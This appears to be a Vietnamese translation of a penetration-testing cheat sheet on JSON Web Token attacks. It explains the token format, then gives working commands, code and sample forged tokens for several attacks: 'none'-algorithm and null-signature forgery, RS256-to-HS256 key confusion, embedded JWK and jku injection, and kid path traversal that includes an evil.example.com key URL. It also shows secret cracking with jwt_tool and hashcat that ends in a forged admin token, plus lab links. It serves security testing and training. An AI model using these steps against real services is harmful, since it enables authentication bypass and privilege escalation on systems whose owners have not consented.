# JWT - JSON Web Token

> JSON Web Token (JWT) là một tiêu chuẩn mở (RFC 7519), định nghĩa một phương thức nhỏ gọn và tự chứa để truyền tải thông tin một cách an toàn giữa các bên dưới dạng một JSON object. Thông tin này có thể được xác minh và tin cậy vì nó được ký bằng chữ ký số.

## Tóm tắt

* [Công cụ](#tools)
* [Định dạng JWT](#jwt-format)

  * [Header](#header)
  * [Payload](#payload)
* [Chữ ký JWT](#jwt-signature)

  * [Chữ ký JWT - Null Signature Attack (CVE-2020-28042)](#jwt-signature---null-signature-attack-cve-2020-28042)
  * [Chữ ký JWT - Lộ chữ ký hợp lệ (CVE-2019-7644)](#jwt-signature---disclosure-of-a-correct-signature-cve-2019-7644)
  * [Chữ ký JWT - None Algorithm (CVE-2015-9235)](#jwt-signature---none-algorithm-cve-2015-9235)
  * [Chữ ký JWT - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)](#jwt-signature---key-confusion-attack-rs256-to-hs256)
  * [Chữ ký JWT - Key Injection Attack (CVE-2018-0114)](#jwt-signature---key-injection-attack-cve-2018-0114)
  * [Chữ ký JWT - Khôi phục Public Key từ JWT đã ký](#jwt-signature---recover-public-key-from-signed-jwts)
* [JWT Secret](#jwt-secret)

  * [Encode và Decode JWT với secret](#encode-and-decode-jwt-with-the-secret)
  * [Phá JWT secret](#break-jwt-secret)
* [JWT Claims](#jwt-claims)

  * [Lạm dụng JWT kid Claim](#jwt-kid-claim-misuse)
  * [JWKS - jku header injection](#jwks---jku-header-injection)
* [Labs](#labs)
* [Tài liệu tham khảo](#references)

## Công cụ

* https://github.com/ticarpi/jwt_tool - 🐍 Bộ công cụ để kiểm thử, tùy chỉnh và crack JSON Web Token
* https://github.com/brendan-rius/c-jwt-cracker - Công cụ brute-force JWT được viết bằng C
* [PortSwigger/JOSEPH](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) - Công cụ hỗ trợ pentest JavaScript Object Signing and Encryption
* [jwt.io](https://jwt.io/) - Công cụ Encoder/Decoder

## Định dạng JWT

JSON Web Token: `Base64(Header).Base64(Data).Base64(Signature)`

Ví dụ: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

Có thể chia JWT thành 3 thành phần được ngăn cách bởi dấu chấm.

```powershell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature
```

### Header

Các tên tham số header được đăng ký được định nghĩa trong [JSON Web Signature (JWS) RFC](https://www.rfc-editor.org/rfc/rfc7515).

JWT header cơ bản nhất là JSON sau:

```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```

Các tham số khác được đăng ký trong RFC.

| Tham số  | Định nghĩa                           | Mô tả                                                                                   |
| -------- | ------------------------------------ | --------------------------------------------------------------------------------------- |
| alg      | Thuật toán                           | Xác định thuật toán mật mã được sử dụng để bảo vệ JWS                                   |
| jku      | JWK Set URL                          | Tham chiếu đến tài nguyên chứa tập hợp các public key được mã hóa dưới dạng JSON        |
| jwk      | JSON Web Key                         | Public key được sử dụng để ký số JWS                                                    |
| kid      | Key ID                               | Key được sử dụng để bảo vệ JWS                                                          |
| x5u      | X.509 URL                            | URL tới chứng chỉ public key X.509 hoặc certificate chain                               |
| x5c      | X.509 Certificate Chain              | Chứng chỉ public key X.509 hoặc certificate chain ở dạng PEM được sử dụng để ký số JWS  |
| x5t      | X.509 Certificate SHA-1 Thumbprint   | SHA-1 thumbprint (digest) được mã hóa Base64 URL của DER encoding của chứng chỉ X.509   |
| x5t#S256 | X.509 Certificate SHA-256 Thumbprint | SHA-256 thumbprint (digest) được mã hóa Base64 URL của DER encoding của chứng chỉ X.509 |
| typ      | Type                                 | Media Type. Thường là `JWT`                                                             |
| cty      | Content Type                         | Không khuyến nghị sử dụng header parameter này                                          |
| crit     | Critical                             | Các extension và/hoặc JWA đang được sử dụng                                             |

Thuật toán mặc định là `HS256` (HMAC SHA256 symmetric encryption).

`RS256` được sử dụng cho mục đích bất đối xứng (RSA asymmetric encryption và private key signature).

| Giá trị tham số `alg` | Digital Signature hoặc MAC Algorithm           | Yêu cầu     |
| --------------------- | ---------------------------------------------- | ----------- |
| HS256                 | HMAC sử dụng SHA-256                           | Bắt buộc    |
| HS384                 | HMAC sử dụng SHA-384                           | Tùy chọn    |
| HS512                 | HMAC sử dụng SHA-512                           | Tùy chọn    |
| RS256                 | RSASSA-PKCS1-v1_5 sử dụng SHA-256              | Khuyến nghị |
| RS384                 | RSASSA-PKCS1-v1_5 sử dụng SHA-384              | Tùy chọn    |
| RS512                 | RSASSA-PKCS1-v1_5 sử dụng SHA-512              | Tùy chọn    |
| ES256                 | ECDSA sử dụng P-256 và SHA-256                 | Khuyến nghị |
| ES384                 | ECDSA sử dụng P-384 và SHA-384                 | Tùy chọn    |
| ES512                 | ECDSA sử dụng P-521 và SHA-512                 | Tùy chọn    |
| PS256                 | RSASSA-PSS sử dụng SHA-256 và MGF1 với SHA-256 | Tùy chọn    |
| PS384                 | RSASSA-PSS sử dụng SHA-384 và MGF1 với SHA-384 | Tùy chọn    |
| PS512                 | RSASSA-PSS sử dụng SHA-512 và MGF1 với SHA-512 | Tùy chọn    |
| none                  | Không thực hiện digital signature hoặc MAC     | Bắt buộc    |

Inject header với https://github.com/ticarpi/jwt_tool: `python3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2`

### Payload

```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```

Claims là các key được định nghĩa trước cùng với giá trị của chúng:

* iss: issuer của token
* exp: timestamp hết hạn (reject các token đã hết hạn). Lưu ý: theo specification, giá trị này phải tính bằng giây.
* iat: Thời điểm JWT được phát hành. Có thể được sử dụng để xác định tuổi của JWT
* nbf: "not before" là thời điểm trong tương lai khi token sẽ bắt đầu có hiệu lực.
* jti: định danh duy nhất cho JWT. Được sử dụng để ngăn JWT bị sử dụng lại hoặc replay.
* sub: subject của token (hiếm khi được sử dụng)
* aud: audience của token (cũng hiếm khi được sử dụng)

Inject payload claims với https://github.com/ticarpi/jwt_tool: `python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3`

## Chữ ký JWT

### Chữ ký JWT - Null Signature Attack (CVE-2020-28042)

Gửi một JWT sử dụng thuật toán HS256 nhưng không có signature, ví dụ `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.`

**Khai thác**:

```ps1
python3 jwt_tool.py JWT_HERE -X n
```

**Phân rã**:

```json
{"alg":"HS256","typ":"JWT"}.
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

### Chữ ký JWT - Lộ chữ ký hợp lệ (CVE-2019-7644)

Gửi một JWT với signature không chính xác; endpoint có thể phản hồi bằng một lỗi làm lộ signature chính xác.

* [jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61](https://github.com/jwt-dotnet/jwt/issues/61)
* [CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)

```ps1
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
```

### Chữ ký JWT - None Algorithm (CVE-2015-9235)

JWT hỗ trợ thuật toán `None` cho signature. Thuật toán này có thể đã được đưa vào để debug ứng dụng. Tuy nhiên, điều này có thể gây ảnh hưởng nghiêm trọng đến bảo mật của ứng dụng.

Các biến thể của None algorithm:

* `none`
* `None`
* `NONE`
* `nOnE`

Để khai thác lỗ hổng này, chỉ cần decode JWT và thay đổi thuật toán được sử dụng cho signature. Sau đó có thể gửi JWT mới. Tuy nhiên, cách này sẽ không hoạt động nếu không **xóa** signature.

Ngoài ra, có thể chỉnh sửa một JWT hiện có (hãy cẩn thận với thời gian hết hạn).

* Sử dụng https://github.com/ticarpi/jwt_tool

  ```ps1
  python3 jwt_tool.py [JWT_HERE] -X a
  ```

* Chỉnh sửa JWT thủ công

  ```python
  import jwt

  jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
  decodedToken = jwt.decode(jwtToken, verify=False)       

  # decode token trước khi encode với type 'None'
  noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

  print(noneEncoded.decode())
  ```

### Chữ ký JWT - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)

Nếu code của server đang chờ token có `alg` được đặt thành RSA nhưng lại nhận token có `alg` được đặt thành HMAC, server có thể vô tình sử dụng public key làm HMAC symmetric key khi xác minh signature.

Vì public key đôi khi có thể được attacker lấy được, attacker có thể thay đổi thuật toán trong header thành HS256 rồi sử dụng RSA public key để ký dữ liệu. Khi ứng dụng sử dụng cùng một cặp RSA key cho TLS web server: `openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout`

> Thuật toán **HS256** sử dụng secret key để ký và xác minh từng message.
> Thuật toán **RS256** sử dụng private key để ký message và public key để xác thực.

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

:warning: Hành vi này đã được sửa trong Python library và sẽ trả về lỗi `jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`. Cần cài đặt version sau: `pip install pyjwt==0.4.3`.

* Sử dụng https://github.com/ticarpi/jwt_tool

  ```ps1
  python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
  ```

* Sử dụng [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)

  1. Tìm public key, thường nằm tại `/jwks.json` hoặc `/.well-known/jwks.json`
  2. Load nó vào tab JWT Editor Keys, click `New RSA Key`.
  3. Trong dialog, paste JWK đã lấy trước đó: `{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}`
  4. Chọn radio `PEM` và copy PEM key kết quả.
  5. Đi tới tab Decoder và Base64-encode PEM.
  6. Quay lại tab JWT Editor Keys và tạo `New Symmetric Key` mới ở định dạng JWK.
  7. Thay giá trị được tạo cho tham số `k` bằng PEM key được encode Base64 vừa copy.
  8. Chỉnh JWT token `alg` thành `HS256` và chỉnh sửa data.
  9. Click `Sign` và giữ tùy chọn `Don't modify header`

* Chỉnh sửa JWT token RS256 thành HS256 thủ công theo các bước sau

  1. Chuyển public key (`key.pem`) sang HEX bằng command này.

     ```powershell
     $ cat key.pem | xxd -p | tr -d "\\n"
     2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
     ```

  2. Tạo HMAC signature bằng cách cung cấp public key dưới dạng ASCII hex cùng token đã được chỉnh sửa.

     ```powershell
     $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a

     (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
     ```

  3. Chuyển signature (Hex sang "base64 URL")

     ```powershell
     python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
     ```

  4. Thêm signature vào payload đã chỉnh sửa

     ```powershell
     [HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]
     eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
     ```

### Chữ ký JWT - Key Injection Attack (CVE-2018-0114)

> Một lỗ hổng trong thư viện mã nguồn mở Cisco node-jose trước phiên bản 0.11.0 có thể cho phép attacker từ xa, không cần xác thực, ký lại token bằng một key được nhúng bên trong token. Lỗ hổng xảy ra do node-jose tuân theo tiêu chuẩn JSON Web Signature (JWS) cho JSON Web Tokens (JWT). Tiêu chuẩn này quy định rằng một JSON Web Key (JWK) đại diện cho public key có thể được nhúng trong header của JWS. Public key này sau đó được tin cậy để xác minh. Attacker có thể khai thác bằng cách giả mạo JWS object hợp lệ: xóa signature gốc, thêm public key mới vào header và ký object bằng private key do attacker sở hữu tương ứng với public key được nhúng trong header JWS đó.

**Khai thác**:

* Sử dụng https://github.com/ticarpi/jwt_tool

  ```ps1
  python3 jwt_tool.py [JWT_HERE] -X i
  ```

* Sử dụng [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)

  1. Thêm một `New RSA key`
  2. Trong tab Repeater của JWT, chỉnh sửa data
  3. `Attack` > `Embedded JWK`

**Phân rã**:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
  }
}.
{"login":"admin"}.
[Signed with new Private key; Public key injected]
```

### Chữ ký JWT - Khôi phục Public Key từ JWT đã ký

Các thuật toán RS256, RS384 và RS512 sử dụng RSA với padding PKCS#1 v1.5 làm signature scheme. Điều này có thuộc tính cho phép tính public key khi có hai message khác nhau cùng các signature tương ứng.

https://github.com/SecuraBV/jws2pubkey: tính RSA public key từ hai JWT đã ký

```ps1
$ docker run -it ttervoort/jws2pubkey JWS1 JWS2
$ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
Computing public key. This may take a minute...
{"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}
```

## JWT Secret

> Để tạo JWT, một secret key được sử dụng để ký header và payload, từ đó tạo ra signature. Secret key phải được giữ bí mật và bảo vệ an toàn để ngăn truy cập trái phép vào JWT hoặc ngăn việc chỉnh sửa nội dung của nó. Nếu attacker có thể truy cập secret key, họ có thể tạo, chỉnh sửa hoặc tự ký token của mình, qua đó bypass các security control được dự kiến.

### Encode và Decode JWT với secret

* Sử dụng https://github.com/ticarpi/jwt_tool:

  ```ps1
  jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
  jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T

  Token header values:
  [+] alg = "HS256"
  [+] typ = "JWT"

  Token payload values:
  [+] name = "John Doe"
  ```

* Sử dụng [pyjwt](https://pyjwt.readthedocs.io/en/stable/): `pip install pyjwt`

  ```python
  import jwt
  encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
  jwt.decode(encoded, 'secret', algorithms=['HS256']) 
  ```

### Phá JWT secret

Danh sách hữu ích gồm 3502 JWT public: [wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list), bao gồm `your_jwt_secret`, `change_this_super_secret_random_string`, v.v.

#### JWT tool

Đầu tiên, brute-force key `"secret"` được sử dụng để tính signature bằng https://github.com/ticarpi/jwt_tool

```powershell
python3 -m pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
```

Sau đó chỉnh sửa field bên trong JSON Web Token.

```powershell
Current value of role is: user
Please enter new value and hit ENTER
> admin
[1] sub = 1234567890
[2] role = admin
[3] iat = 1516239022
[0] Continue to next step

Please select a field number (or 0 to Continue):
> 0
```

Cuối cùng, hoàn thiện token bằng cách ký nó với `"secret"` key đã lấy được trước đó.

```powershell
Token Signing:
[1] Sign token with known key
[2] Strip signature from token vulnerable to CVE-2015-2951
[3] Sign with Public Key bypass vulnerability
[4] Sign token with key file

Please select an option from above (1-4):
> 1

Please enter the known key:
> secret

Please enter the key length:
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512
> 1

Your new forged token:
[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic
[+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
```

* Recon: `python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`
* Scanning: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb`
* Exploitation: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
* Fuzzing: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt`
* Review: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`

#### Hashcat

> Đã bổ sung hỗ trợ crack JWT (JSON Web Token) với hashcat ở tốc độ 365MH/s trên một GTX1080 - [src](https://twitter.com/hashcat/status/955154646494040065)

* Dictionary attack: `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
* Rule-based attack: `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
* Brute force attack: `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`

## JWT Claims

[IANA's JSON Web Token Claims](https://www.iana.org/assignments/jwt/jwt.xhtml)

### Lạm dụng JWT kid Claim

Claim `"kid"` (key ID) trong JSON Web Token (JWT) là một header parameter tùy chọn, được sử dụng để chỉ ra identifier của cryptographic key đã được dùng để ký hoặc mã hóa JWT. Điều quan trọng cần lưu ý là bản thân key identifier không cung cấp lợi ích bảo mật nào, mà thay vào đó cho phép bên nhận xác định key cần thiết để xác minh tính toàn vẹn của JWT.

* Ví dụ #1: Local file

  ```json
  {
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/root/res/keys/secret.key"
  }
  ```

* Ví dụ #2: Remote file

  ```json
  {
      "alg":"RS256",
      "typ":"JWT",
      "kid":"http://localhost:7070/privKey.key"
  }
  ```

Nội dung của file được chỉ định trong `kid` header sẽ được sử dụng để tạo signature.

```js
// Example for HS256
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-256-bit-secret-from-secret.key
)
```

Các cách phổ biến để lạm dụng `kid` header:

* Lấy nội dung key để thay đổi payload

* Thay đổi key path để trỏ đến file do chính mình kiểm soát

  ```py
  >>> jwt.encode(
  ...     {"some": "payload"},
  ...     "secret",
  ...     algorithm="HS256",
  ...     headers={"kid": "http://evil.example.com/custom.key"},
  ... )
  ```

* Thay đổi key path thành một file có nội dung có thể dự đoán được.

  ```ps1
  python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
  python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
  ```

* Chỉnh sửa `kid` header để thử SQL Injection và Command Injection

### JWKS - jku header injection

Giá trị `jku` header trỏ đến URL của file JWKS. Bằng cách thay URL `jku` bằng một URL do attacker kiểm soát chứa Public Key, attacker có thể sử dụng Private Key tương ứng để ký token, sau đó để service truy xuất Public Key độc hại và xác minh token.

Đôi khi JWKS được expose public thông qua các endpoint tiêu chuẩn:

* `/jwks.json`
* `/.well-known/jwks.json`
* `/openid/connect/jwks.json`
* `/api/keys`
* `/api/v1/keys`
* [`/{tenant}/oauth2/v1/certs`](https://web.archive.org/web/20240116204119/https://docs.theidentityhub.com/doc/Protocol-Endpoints/OpenID-Connect/OpenID-Connect-JWKS-Endpoint.html)

Bạn nên tạo cặp key của riêng mình cho cuộc tấn công này và host nó. Nó sẽ có dạng:

```json
{
    "keys": [
        {
            "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
            "kty": "RSA",
            "e": "AQAB",
            "n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
        }
    ]
}
```

**Khai thác**:

* Sử dụng https://github.com/ticarpi/jwt_tool

  ```ps1
  python3 jwt_tool.py JWT_HERE -X s
  python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
  ```

* Sử dụng [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)

  1. Tạo một RSA key mới và host nó
  2. Chỉnh sửa data của JWT
  3. Thay `kid` header bằng giá trị từ JWKS của bạn
  4. Thêm `jku` header và ký JWT (phải bật tùy chọn `Don't modify header`)

**Phân rã**:

```json
{"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}.
{"login":"admin"}.
[Signed with new Private key; Public key exported]
```

## Labs

* [PortSwigger - Bypass xác thực JWT thông qua signature không được xác minh](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
* [PortSwigger - Bypass xác thực JWT thông qua xác minh signature sai](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
* [PortSwigger - Bypass xác thực JWT thông qua signing key yếu](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
* [PortSwigger - Bypass xác thực JWT thông qua JWK header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
* [PortSwigger - Bypass xác thực JWT thông qua jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
* [PortSwigger - Bypass xác thực JWT thông qua kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
* [Root Me - JWT - Giới thiệu](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Introduction)
* [Root Me - JWT - Token đã bị thu hồi](https://www.root-me.org/en/Challenges/Web-Server/JWT-Revoked-token)
* [Root Me - JWT - Secret yếu](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
* [Root Me - JWT - Chữ ký file không an toàn](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)
* [Root Me - JWT - Public key](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
* [Root Me - JWT - Header Injection](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
* [Root Me - JWT - Xử lý Key không an toàn](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)

## Tài liệu tham khảo

* [5 Bước đơn giản để hiểu JSON Web Token - Shaurya Sharma - December 21, 2019](https://web.archive.org/web/20210218162416/https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5)
* [Tấn công JWT Authentication - Sjoerd Langkemper - September 28, 2016](https://web.archive.org/web/20251102094325/https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
* [Club EH RM 05 - Giới thiệu về khai thác JSON Web Token - Nishacid - February 23, 2023](https://web.archive.org/web/20250914204544/https://www.youtube.com/watch?v=d7wmUz57Nlg)
* [Các lỗ hổng nghiêm trọng trong thư viện JSON Web Token - Tim McLean - March 31, 2015](https://web.archive.org/web/20260207024257/https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
* [Tấn công JSON Web Token (JWT) - pwnzzzz - May 3, 2018](https://web.archive.org/web/20180509012007/https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
* [Tấn công JSON Web Tokens - Từ Zero đến Hero mà không cần nỗ lực - Websecurify - February 9, 2017](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
* [Tấn công JSON Web Tokens - Vickie Li - October 27, 2019](https://web.archive.org/web/20191028125424/https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
* [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng) - August 27, 2017](https://web.archive.org/web/20240229055017/https://nandynarwhals.org/hitbgsec2017-pasty/)
* [Cách hack một triển khai JWT yếu bằng Timing Attack - Tamas Polgar - January 7, 2017](https://web.archive.org/web/20190331200826/https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
* [JWT Validation Bypass trong Auth0 Authentication API - Ben Knight - April 16, 2020](https://web.archive.org/web/20230104231143/https://insomniasec.com/blog/auth0-jwt-validation-bypass)
* [Các lỗ hổng JSON Web Token - 0xn3va - March 27, 2022](https://web.archive.org/web/20260305090633/https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities)
* [JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8, 2017](https://web.archive.org/web/20190405023824/https://trustfoundry.net/jwt-hacking-101/)
* [Tìm hiểu cách sử dụng JSON Web Tokens (JWT) cho Authentication - dwyl - May 3, 2022](https://github.com/dwyl/learn-json-web-tokens)
* [Privilege Escalation như một Boss - janijay007 - October 27, 2018](https://web.archive.org/web/20190723093831/https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
* [JWT Hacking đơn giản - Hari Prasanth (@b1ack_h00d) - March 7, 2019](https://web.archive.org/web/20200724145838/https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
* [WebSec CTF - Authorization Token - JWT Challenge - Kris Hunt - August 7, 2016](https://web.archive.org/web/20211025223311/https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
